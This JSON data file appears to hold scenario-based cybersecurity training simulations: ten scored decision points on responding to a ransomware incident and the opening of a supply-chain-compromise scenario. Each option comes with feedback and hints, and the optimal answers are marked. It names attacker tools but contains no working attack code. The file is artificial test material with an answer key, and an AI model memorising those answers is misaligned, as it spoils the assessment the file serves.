            "feedback": "{'short': 'Correct! Technical evidence provides objective timeline', 'detailed': 'EDR telemetry shows process execution, file access, and network connections with precise timestamps. Email logs reveal malicious message delivery. Working backward from the first alert (03:31 PowerShell execution) through EDR history reveals the full attack timeline: email received Friday 16:42, macro executed 16:43, C2 established 16:43, ~11 hours of attacker activity before ransomware deployment.', 'consequence': 'Complete attack timeline reconstructed. Initial phishing email identified. Dwell time and attacker activities mapped.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Run antivirus scans across all systems to find the malware origin",
            "feedback": "{'short': 'Wrong tool for timeline investigation', 'detailed': \"Antivirus identifies current malware presence but doesn't provide historical timeline or show how the attack progressed. By the time ransomware is detected, the initial access malware may be deleted or evolved. AV is a detection tool, not an investigation tool. Use EDR and SIEM for forensic timeline.\", 'consequence': 'AV finds current ransomware but provides no insight into how or when attack started, or what else attackers did.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus on recovery - knowing how it started doesn't help stop the current attack",
            "feedback": "{'short': 'Understanding attack is essential for effective response', 'detailed': \"Understanding initial access and attack timeline is critical for: ensuring containment is complete (are there other access points?), credential compromise assessment (what did attackers access?), determining data exposure (what was exfiltrated?), and preventing reinfection during recovery. You can't effectively recover without understanding the attack.\", 'consequence': \"Recovery begins without understanding attack scope. Attackers' secondary access point allows them to recompromise restored systems.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "EDR solutions record detailed telemetry about process execution, file access, and network connections with timestamps."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Work backward from the first alert through EDR history. Check email logs for the delivery time of any malicious attachments."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Credential Compromise Scope",
        "situation": "Your investigation reveals the attacker used Mimikatz to dump credentials and has been active for ~11 hours. They achieved lateral movement to file servers and possibly domain controllers. You need to assess credential compromise to plan recovery.\n\n**Question:** What is the MOST critical assumption to make about credential compromise?",
        "options": [
          {
            "id": "A",
            "text": "Only credentials on systems with detected Mimikatz activity are compromised",
            "feedback": "{'short': 'Dangerously narrow assumption', 'detailed': 'Mimikatz detection represents where you SAW it run - attackers may have run it on other systems without detection, or used other credential theft techniques. Additionally, credentials move with users - if an admin logged into a compromised system, their credentials are compromised even without Mimikatz running there. Assume broader compromise.', 'consequence': 'Reset passwords for 3 accounts while 15 other compromised accounts are overlooked. Attacker retains access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "All accounts that authenticated to ANY compromised system should be considered compromised",
            "feedback": "{'short': 'Correct! Assume broad credential compromise', 'detailed': 'Credential theft can capture any credentials present on a compromised system - not just local accounts but any user who authenticated there. Domain credentials, service accounts, cached credentials - all at risk. The safest assumption is that ANY account that touched ANY compromised system is compromised. This drives comprehensive password resets.', 'consequence': 'Comprehensive credential compromise assessment identifies 147 accounts requiring reset, including service accounts and admin credentials.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Focus only on Domain Admin accounts since those are most critical",
            "feedback": "{'short': 'Important but incomplete', 'detailed': 'Domain Admin accounts are critical and must be prioritized, but attackers also leverage service accounts (often with excessive privileges), tier-1 admin accounts, and even standard user accounts for persistence. A compromised service account with backup privileges can be devastating. All privileged accounts need assessment.', 'consequence': 'Domain Admin reset completed. Attacker returns via compromised backup service account that was overlooked.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Wait for forensic analysis to confirm which specific credentials were stolen",
            "feedback": "{'short': 'Too slow during active incident', 'detailed': 'Complete forensic confirmation of credential theft can take days or weeks. During an active incident, you must act on reasonable assumptions. If Mimikatz ran on a system, assume all credentials on that system are compromised. Act now, validate later. The risk of assuming too narrow is recompromise.', 'consequence': 'Waiting for forensics while attacker uses stolen credentials to maintain access and monitor recovery efforts.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Credential theft tools can capture any credentials present in memory on a compromised system, not just local accounts."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Assume all accounts that authenticated to any compromised system are compromised. This includes service accounts, admin accounts, and users who happened to log in."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Data Exfiltration Assessment",
        "situation": "The ransom note claims data exfiltration. Your network analysis confirms large outbound transfers to Mega.nz cloud storage: approximately 847 GB from Finance, Engineering, HR, and Contracts file shares. This happened before encryption began.\n\n**Question:** How does confirmed data exfiltration change your incident response priorities?",
        "options": [
          {
            "id": "A",
            "text": "It doesn't - exfiltration already happened, focus on ransomware recovery",
            "feedback": "{'short': 'Exfiltration has major implications beyond ransomware', 'detailed': \"Data exfiltration transforms this from a ransomware incident to a data breach with regulatory notification requirements, potential extortion beyond decryption, and long-term business impact (intellectual property theft). Recovery focus shifts from 'restore systems' to 'breach response' with legal, regulatory, and customer notification requirements.\", 'consequence': 'Organization focuses on technical recovery while missing regulatory notification deadlines. Legal exposure increases.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "It strengthens the case for paying ransom to prevent data publication",
            "feedback": "{'short': \"Payment doesn't guarantee data destruction\", 'detailed': 'There is NO guarantee attackers will delete exfiltrated data after payment. They may sell it, use it for future extortion, or simply lie. Multiple victims have paid and still had data leaked. The data is gone - payment decisions should focus on decryption value, not data deletion promises which are unenforceable.', 'consequence': 'Organization pays ransom expecting data deletion. Data appears on leak site 3 months later anyway.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Initiate breach response procedures - legal notification, regulatory assessment, customer impact analysis",
            "feedback": "{'short': 'Correct! Exfiltration triggers breach response requirements', 'detailed': \"Confirmed exfiltration of PII and sensitive data triggers formal breach response: legal counsel engagement, regulatory notification timeline assessment (many states require notification within 72 hours), customer and employee impact analysis, and preparation for potential data publication. This runs parallel to technical recovery. Breach response has legal deadlines that can't wait for systems to be restored.\", 'consequence': 'Legal engaged immediately. Breach notification timeline established. Regulatory requirements met. Customer communication prepared.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus on identifying exactly what data was taken before any other actions",
            "feedback": "{'short': \"Detailed analysis important but shouldn't delay notification preparation\", 'detailed': 'Understanding exactly what was exfiltrated is important but can take weeks. Regulatory notification clocks start when you discover the breach, not when you finish analyzing it. Begin breach response procedures immediately while conducting detailed data assessment in parallel. You can refine notifications as analysis progresses.', 'consequence': 'Detailed analysis takes 2 weeks. 72-hour state notification deadline missed. Regulatory scrutiny intensifies.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Data exfiltration transforms a ransomware incident into a data breach with notification requirements."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Breach notification laws have specific timelines (often 72 hours) that start when you discover the breach. Engage legal and begin notification assessment immediately."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Backup Integrity Assessment",
        "situation": "Your backup administrator reports bad news: the Veeam backup server was compromised, and recent backups are encrypted. However, the Azure offsite replicas use immutable storage and separate credentials - they appear intact. The Data Domain has retention-locked backups older than 7 days.\n\n**Question:** What is the correct approach to backup validation before recovery?",
        "options": [
          {
            "id": "A",
            "text": "Begin restoration from Azure immediately - we need systems back online ASAP",
            "feedback": "{'short': 'Speed without validation risks reinfection', 'detailed': 'While urgency is real, restoring without validation risks: restoring systems that were already compromised before backup, reintroducing malware that was backed up, and wasting time if backups are corrupted. Validate backup integrity and check backup timestamps against attack timeline before restoration.', 'consequence': \"Restored systems come back with Cobalt Strike beacon active. Attacker maintains access through 'recovered' systems.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Validate backup integrity in isolated environment and verify backup date is before compromise",
            "feedback": "{'short': 'Correct! Validate before restoring to production', 'detailed': 'Restore backups to an isolated environment first to: verify backup integrity (not corrupted), check for malware presence in backup data, confirm backup timestamp is before initial compromise (Friday 16:42 for ideal, Friday 23:00 acceptable with some exposure). Only restore validated, clean backups to production. This prevents restoring the infection.', 'consequence': 'Backups validated in isolated environment. Friday 23:00 Azure backup confirmed clean. Restoration proceeds safely.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Use the oldest backups available to ensure we predate any possible compromise",
            "feedback": "{'short': 'Safer but unnecessarily high data loss', 'detailed': \"Using week-old backups means losing a week of business data when newer clean backups may exist. Compare backup timestamps to attack timeline - backups from Friday 23:00 predate ransomware deployment (Saturday 03:31) with only hours of data loss. Don't accept unnecessary data loss if newer clean backups exist.\", 'consequence': 'Week-old backup restored. 7 days of orders, transactions, and work lost when 5-hour-old clean backup was available.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Contact Veeam support to help decrypt the compromised backup server",
            "feedback": "{'short': 'The backup server itself was compromised', 'detailed': \"The ransomware encrypted the Veeam backup server and catalog. Even if you could decrypt it, the integrity of backups managed by a compromised server is suspect. The attackers had access to the backup infrastructure and may have corrupted or manipulated backups. Use backups from infrastructure the attackers didn't control (Azure with separate creds).\", 'consequence': \"Days spent trying to recover compromised backup server. Backups from that server can't be trusted anyway.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Backups can contain malware if the backup was taken after initial compromise. Check backup timestamps against attack timeline."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Restore to an isolated environment first to validate integrity and scan for malware before restoring to production."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Understanding the Malware",
        "situation": "Your malware analysis team has examined the ransomware and associated tools. They've identified BlackMatter ransomware, Cobalt Strike for C2, and various living-off-the-land techniques. Understanding the malware helps plan eradication.\n\n**Question:** Based on the malware analysis, what is MOST important for planning eradication?",
        "options": [
          {
            "id": "A",
            "text": "The encryption algorithm - to assess if decryption without payment is possible",
            "feedback": "{'short': 'Important for recovery options but not eradication', 'detailed': \"BlackMatter uses ChaCha20 + RSA-4096 hybrid encryption which is not practically breakable. While checking for decryptors is worthwhile, this doesn't help plan eradication. Modern ransomware encryption is effectively unbreakable without the key. Focus on removing attacker access, not breaking crypto.\", 'consequence': 'Time spent researching impossible decryption while attacker maintains access through Cobalt Strike.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "The persistence mechanisms - to ensure complete removal of attacker access",
            "feedback": "{'short': 'Correct! Persistence removal is key to eradication', 'detailed': 'Attackers establish multiple persistence mechanisms: scheduled tasks, registry run keys, service installations, and potentially Golden Tickets if krbtgt was compromised. Complete eradication requires identifying and removing ALL persistence, not just the ransomware binary. Missing persistence means attackers can return after recovery.', 'consequence': 'All persistence mechanisms identified: scheduled tasks, registry keys, and potential krbtgt compromise. Comprehensive eradication plan developed.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "The ransomware variant - to find victim communities and negotiation tips",
            "feedback": "{'short': 'Relevant for business decisions, not technical eradication', 'detailed': 'Knowing the ransomware group can help with ransom negotiation intelligence, but this is a business/legal decision separate from technical eradication. The technical team needs to focus on removing attacker access regardless of whether the organization decides to pay or not.', 'consequence': 'Research into BlackMatter group provides negotiation intel but delays technical eradication planning.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "The exploit used for initial access - to patch the vulnerability",
            "feedback": "{'short': 'Important for prevention but initial access was social engineering', 'detailed': \"The initial access was a phishing email with malicious macro - not a software vulnerability to patch. While email security improvements are important lessons learned, the immediate eradication priority is removing current attacker access. The attackers are already in; patching the door doesn't remove them from the house.\", 'consequence': \"Email security review initiated but doesn't address the Cobalt Strike backdoors still active in the environment.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Attackers establish multiple ways to maintain access. What happens if you miss one during eradication?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Persistence mechanisms (scheduled tasks, registry keys, services, Kerberos Golden Tickets) allow attackers to return. All must be identified and removed."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "The Ransom Decision",
        "situation": "It's now Sunday morning. The CEO is demanding a recommendation on whether to pay the ransom. The business is losing $1.8M per day, customers are calling, and the attackers' 72-hour timer is counting down. Your recovery timeline is 5-7 days to restore critical systems.\n\n**Question:** What recommendation should you provide regarding ransom payment?",
        "options": [
          {
            "id": "A",
            "text": "Recommend paying - the business impact of extended downtime exceeds the likely ransom",
            "feedback": "{'short': 'Financial analysis is incomplete', 'detailed': \"Pure cost comparison is insufficient. Consider: payment doesn't guarantee working decryptor (some fail), payment funds criminal operations and may invite repeat attacks, payment may violate OFAC sanctions (legal risk), and you still need to rebuild security (criminals shouldn't stay in your network). Business decision, but security should present complete picture.\", 'consequence': 'Organization pays $3.5M ransom. Decryptor works on 85% of files. Attackers return 4 months later knowing organization will pay.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Recommend against paying - we have backups and can recover without funding criminals",
            "feedback": "{'short': 'Principled but presents incomplete picture', 'detailed': 'While not paying is often the right choice, presenting it as a simple recommendation oversimplifies. This is a business decision with trade-offs: backup recovery takes 5-7 days ($9-12.6M in downtime), data will likely be published (breach costs), and some unique data may be unrecoverable. Security provides analysis; executives make the decision.', 'consequence': 'Executive team feels security dismissed business concerns. Trust damaged. Decision made without complete analysis.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Present a complete analysis of both options with risks, costs, and uncertainties - let leadership decide",
            "feedback": "{'short': 'Correct! Provide analysis, not just recommendation', 'detailed': \"Ransom decisions involve business, legal, ethical, and technical factors beyond security's sole purview. Security should provide: recovery timeline and costs without payment, ransom amount and payment risks, legal considerations (OFAC, cyber insurance), likelihood of decryptor working, and the fact that data publication risk exists regardless of payment. Leadership makes the informed decision.\", 'consequence': 'Complete briefing provided. Legal confirms no OFAC issues. Leadership decides to attempt recovery first with payment as backup option. Informed decision made.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Defer to law enforcement - let the FBI make the recommendation",
            "feedback": "{'short': \"Law enforcement doesn't make business decisions for victims\", 'detailed': \"FBI provides guidance (generally recommends against payment) and may have intelligence about the threat actor, but they don't make ransom decisions for victims. The business must decide based on their specific circumstances. FBI engagement is valuable for intelligence and potential recovery assistance, but the decision remains with the organization.\", 'consequence': \"FBI provides standard 'don't pay' guidance but can't make the decision. Leadership still needs internal analysis to decide.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Ransom decisions involve business, legal, ethical, and technical considerations. Who should make this decision?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Security provides technical analysis and recovery options. Legal assesses regulatory implications. Leadership makes the business decision with complete information."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Recovery Sequencing",
        "situation": "Leadership has decided to proceed with backup recovery (no ransom payment). You're planning the recovery sequence. Critical systems include Active Directory, ERP, email, and file servers. You have validated clean backups ready.\n\n**Question:** What is the correct sequence for system recovery?",
        "options": [
          {
            "id": "A",
            "text": "ERP first - it has the highest business impact and revenue dependency",
            "feedback": "{'short': \"Business priority doesn't equal technical sequence\", 'detailed': \"ERP is critical for business but depends on other infrastructure: Active Directory for authentication, DNS for name resolution, and network services for connectivity. Recovering ERP before its dependencies means it won't function properly. Technical dependencies must drive sequence even when business prioritizes differently.\", 'consequence': \"ERP restored but can't authenticate users because AD isn't recovered. Time wasted on non-functional restoration.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Active Directory first, then core infrastructure, then business applications",
            "feedback": "{'short': 'Correct! Dependency-based recovery sequence', 'detailed': 'Recovery must follow technical dependencies: (1) Active Directory/DNS - authentication and name resolution foundation; (2) Core infrastructure - network services, monitoring; (3) Critical applications - ERP, email; (4) File servers and secondary systems; (5) End-user workstations. Each layer depends on the previous. Additionally, krbtgt must be reset (twice) as part of AD recovery.', 'consequence': 'AD restored with krbtgt reset. ERP brought online with working authentication. Systematic recovery proceeds without backtracking.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Email first - leadership needs communication capability for crisis management",
            "feedback": "{'short': 'Understandable priority but wrong sequence', 'detailed': 'Communication is important, but email (Exchange) depends on Active Directory. Restoring Exchange before AD means no authentication. Use alternative communication (Teams cloud, personal email, phone) during recovery. Technical dependencies must drive sequence even for high-priority systems.', 'consequence': \"Exchange restored but users can't authenticate. Workaround communications continue anyway while AD is then recovered.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Recover everything in parallel to minimize total recovery time",
            "feedback": "{'short': 'Parallel recovery of interdependent systems fails', 'detailed': \"Systems have dependencies - recovering them in parallel means dependent systems fail because their prerequisites aren't ready. You'd spend more time troubleshooting failed recoveries than you'd save through parallelization. Dependency-ordered recovery is faster in practice.\", 'consequence': \"Multiple recovery failures as systems can't find their dependencies. Troubleshooting extends recovery time beyond sequential approach.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What systems do other systems depend on? Authentication? Name resolution?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Recovery sequence follows dependencies: Identity (AD) \u00e2\u2020\u2019 Infrastructure (DNS, DHCP) \u00e2\u2020\u2019 Applications (ERP, Email) \u00e2\u2020\u2019 Data (File servers) \u00e2\u2020\u2019 Endpoints."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Post-Incident Improvements",
        "situation": "Recovery is progressing well - critical systems are back online. Leadership wants to know what security improvements will prevent this from happening again. You're preparing recommendations for the post-incident review.\n\n**Question:** What is the MOST impactful security improvement based on this incident?",
        "options": [
          {
            "id": "A",
            "text": "Implement email sandboxing to catch malicious attachments",
            "feedback": "{'short': 'Addresses initial access but attackers adapt', 'detailed': \"Email sandboxing is valuable and would likely have caught this initial access. However, it's just one control for one vector. Attackers will find other ways in (different phishing techniques, exploits, supply chain, etc.). Defense in depth requires controls across the entire attack chain, not just initial access.\", 'consequence': 'Sandboxing implemented. Next attack uses different initial access vector. Same outcome.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Deploy immutable, air-gapped backups with regular restoration testing",
            "feedback": "{'short': 'Correct! Resilient backups are foundational', 'detailed': \"The Azure immutable backups saved this organization. Resilient backup strategy (immutable storage, separate credentials, offsite/air-gapped copies, regular restoration testing) is the most impactful improvement because it provides recovery capability regardless of what attack succeeds. It's your last line of defense when prevention fails. Backup resilience changes ransomware from 'catastrophic' to 'expensive inconvenience.'\", 'consequence': 'Immutable backup strategy implemented across all critical systems. Future ransomware events have known recovery path with validated backups.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Mandatory security awareness training on phishing identification",
            "feedback": "{'short': 'Helpful but relies on human perfection', 'detailed': \"Training reduces phishing success rates but can't eliminate them - humans will always be fallible, especially with sophisticated spear-phishing. Training is part of defense-in-depth but shouldn't be the primary control. Technical controls (email security, EDR, network segmentation) provide more reliable protection.\", 'consequence': 'Training implemented. Click rates improve but next sophisticated phishing campaign still succeeds with different employee.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "24/7 SOC monitoring to detect attacks faster",
            "feedback": "{'short': \"Better detection helps but doesn't prevent damage\", 'detailed': 'Faster detection is valuable - this attack had 11 hours of dwell time before ransomware deployment. However, detection without proper controls still means incident response, potential data exfiltration, and business impact. Detection is important but prevention and resilience (backups) reduce impact more than faster detection.', 'consequence': '24/7 SOC detects next attack at hour 3 instead of hour 11. Significant damage still occurs before containment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What control provides recovery capability regardless of how successful the attack is?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Immutable, air-gapped backups with tested restoration procedures are the foundation of ransomware resilience. They provide recovery regardless of what prevention controls fail."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-SIM-004",
    "title": "Supply Chain Compromise",
    "domain": 2,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": "50-65 minutes",
    "role": "Senior Security Engineer",
    "organization": {
      "name": "NexGen Software Solutions",
      "industry": "Enterprise Software (B2B)"
    },
    "introduction": "It's Monday morning when your threat intelligence feed highlights a concerning report: CISA has issued an advisory about a suspected supply chain compromise affecting enterprise software vendors. The advisory mentions indicators associated with a sophisticated threat actor targeting software build pipelines. While reviewing the indicators, your stomach drops - one of the C2 domains has been seen in DNS logs from your build server environment. You pull the logs and confirm: your build server has been communicating with known APT infrastructure for the past 6 weeks. Your software has been distributed to 2,800 enterprise customers, including defense contractors and government agencies. This could be the next SolarWinds.",
    "learning_objectives": [
      "Compare and contrast common threat actors and motivations",
      "Explain common threat vectors and attack surfaces",
      "Given a scenario, analyze indicators of malicious activity"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Initial Threat Assessment",
        "situation": "You've matched CISA IoCs to DNS traffic from your build server. The C2 domain 'telemetry-cdn.cloudfront.net' has been queried 847 times over 42 days from BUILD-SRV-01. This is your primary build server for NexGen Endpoint Manager, which is deployed to 2,800 enterprise customers.\n\n**Question:** What is your FIRST priority after confirming this IoC match?",
        "options": [
          {
            "id": "A",
            "text": "Immediately shut down all build infrastructure to stop potential malware distribution",
            "feedback": "{'short': 'Right instinct but may be premature', 'detailed': \"While stopping further contamination is important, immediate shutdown destroys volatile forensic evidence (memory, network connections, running processes). With 42 days of activity, this isn't a racing-clock scenario. A brief pause to capture forensic state won't significantly increase risk but will dramatically improve investigation capability.\", 'consequence': 'Build servers shut down. Running processes terminated. Volatile evidence lost. Investigation significantly hampered.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Capture forensic images and volatile data, then isolate build infrastructure",
            "feedback": "{'short': 'Correct! Evidence preservation before containment', 'detailed': \"With a sophisticated APT that's been active for 42 days, the immediate risk window is hours, not minutes. Capturing memory dumps, network connection state, and running processes before isolation preserves critical evidence. Then isolate to prevent further activity. This balanced approach enables effective investigation while containing the threat.\", 'consequence': 'Memory dumps captured showing active C2 connection. Process list preserved. Build servers then isolated. Rich forensic evidence available.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Investigate quietly without isolating - we don't want to alert the attackers",
            "feedback": "{'short': 'Dangerous - continued access means continued compromise', 'detailed': \"While not alerting attackers has value, allowing continued access to build infrastructure means potentially more compromised builds, more customer impact, and more data exfiltration. The attackers have had 42 days - the priority now is stopping the bleeding. Sophisticated attackers assume they'll eventually be detected.\", 'consequence': 'Investigation continues while attackers maintain access. Additional backdoored build released during investigation. More customers affected.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Contact CISA and FBI before taking any technical actions",
            "feedback": "{'short': \"Important but shouldn't delay evidence preservation\", 'detailed': \"Law enforcement and CISA notification is absolutely required for a suspected nation-state supply chain attack. However, waiting for them before preserving evidence could mean losing volatile data. Capture forensic state, isolate systems, THEN contact authorities. They'll want to see your evidence anyway.\", 'consequence': 'FBI contacted. They ask what evidence you have. You realize volatile evidence should have been captured first.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What evidence exists only while systems are running that would be lost if you shut them down?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Memory dumps, active network connections, running processes, and logged-in sessions are volatile evidence. Capture before isolation."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Threat Actor Assessment",
        "situation": "The CISA advisory attributes this activity to APT29/COZY SPIDER, associated with Russian intelligence services. Your CEO asks: 'Is this really a nation-state attack or could it be regular criminals? How confident should we be in this attribution?'\n\n**Question:** How should you characterize this threat actor to leadership?",
        "options": [
          {
            "id": "A",
            "text": "We can't confirm attribution - focus on the technical indicators, not who's behind it",
            "feedback": "{'short': 'Attribution matters for risk assessment', 'detailed': 'While technical response is similar regardless of attacker, attribution significantly impacts risk assessment: nation-state actors have different objectives (espionage vs. financial), resources (extensive), patience (years-long operations), and targets (government/defense customers). Leadership needs accurate threat characterization to make informed decisions about notification, resources, and business impact.', 'consequence': 'Leadership treats this as ordinary malware. Resources allocated accordingly. Severity underestimated.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "CISA attributes to APT29 (Russian SVR) - a sophisticated nation-state actor focused on espionage against government and defense",
            "feedback": "{'short': 'Correct! Communicate attribution with appropriate context', 'detailed': \"CISA's attribution to APT29 is significant intelligence that leadership needs. APT29's characteristics - targeting government/defense, supply chain methodology, patient long-term access, espionage motivation - directly impact risk assessment. Their government and defense customers face the highest risk. Attribution also triggers specific notification requirements.\", 'consequence': 'Leadership understands severity. Resources appropriately allocated. Government customers prioritized. FBI engagement accelerated.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "This is definitely Russian government hackers - we need to go public immediately",
            "feedback": "{'short': 'Overconfident and premature', 'detailed': \"While CISA's attribution is credible, stating 'definitely' overstates certainty. Attribution is probabilistic, not absolute. Additionally, going public immediately without investigation, customer notification, and coordination with authorities could cause more harm. Communicate what's known with appropriate confidence levels.\", 'consequence': 'Premature public statement. Attribution questioned. Customers learn from press before company notification. Authorities frustrated.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "It's probably just cybercriminals who copied APT29's tools - nation-states wouldn't target us",
            "feedback": "{'short': 'Dangerous underestimation', 'detailed': \"Software vendors with government/defense customers are prime targets for supply chain attacks - exactly APT29's methodology (see: SolarWinds). Dismissing the attribution because 'they wouldn't target us' ignores the attack pattern. Your product is deployed across government agencies and defense contractors - exactly APT29's target set.\", 'consequence': 'Leadership underestimates threat. Inadequate resources allocated. Government customers not prioritized. Risk to national security increased.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What distinguishes nation-state APTs from cybercriminals in terms of motivation, targets, and methods?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "APT29 specifically targets government, defense, and their supply chain for espionage purposes. They conduct supply chain attacks to reach their actual targets."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Scope Determination",
        "situation": "Forensic analysis of BUILD-SRV-01 reveals a sophisticated implant using DLL side-loading, plus modifications to post-build scripts. The build logs show three release builds were created after the compromise: v4.2.1, v4.2.2, and v4.3.0. All were signed with your code signing certificate and distributed to customers.\n\n**Question:** What is the scope of the supply chain compromise?",
        "options": [
          {
            "id": "A",
            "text": "Only systems that received version 4.3.0 (the most recent) are affected",
            "feedback": "{'short': 'Understates the scope significantly', 'detailed': 'The forensic timeline shows the build script was modified on January 5th, before v4.2.1 was released. All three builds (v4.2.1, v4.2.2, v4.3.0) were created after the script modification. Any customer who installed any of these versions received compromised software.', 'consequence': 'Only v4.3.0 customers notified. 1,847 installations of v4.2.1/v4.2.2 remain compromised and unaware.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "All customers who installed v4.2.1, v4.2.2, or v4.3.0 received compromised software",
            "feedback": "{'short': 'Correct! All post-compromise builds are affected', 'detailed': 'The build script modification predates all three releases. Timeline: compromise Jan 2, script modification Jan 5, v4.2.1 released Jan 8, v4.2.2 released Jan 22, v4.3.0 released Feb 5. All 3,006 installations across these versions received backdoored software. This affects approximately 2,156 unique customers.', 'consequence': 'Complete scope identified. All affected customers can be notified. No compromised installations overlooked.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "All customers are affected since we don't know how far back the compromise goes",
